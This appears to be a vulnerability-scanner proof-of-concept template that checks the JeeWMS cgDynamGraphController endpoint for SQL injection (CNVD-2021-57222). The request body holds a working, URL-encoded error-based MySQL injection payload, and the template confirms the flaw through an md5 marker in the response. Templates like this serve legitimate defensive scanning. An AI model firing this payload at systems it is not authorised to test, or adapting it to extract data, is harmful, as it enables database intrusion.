name: poc-yaml-jeewms-cgdynamgraphcontroller-sqli
binding: c2ef0213-5f93-4479-9b89-bab47c08d599
manual: true
detail:
    author: junfei.song@chaitin.com
    links:
        - https://www.cnvd.org.cn/flaw/show/CNVD-2021-57222
    vulnerability:
        id: CT-529793
        level: high
transport: http
set:
    r1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: ^/jeewms/cgDynamGraphController.do?datagrid
            headers:
                Content-Type: application/x-www-form-urlencoded; charset=UTF-8
            body: configId=t_s_log%27%20AND%20GTID_SUBSET%28CONCAT%280x716a6a7171%2C%28SELECT%20MID%28%28IFNULL%28CAST%28md5%28{{r1}}%29%20AS%20NCHAR%29%2C0x20%29%29%2C1%2C190%29%29%2C0x7176717871%29%2C9050%29--%20JTaD
        expression: response.body.bcontains(bytes(md5(string(r1))))
expression: r0()
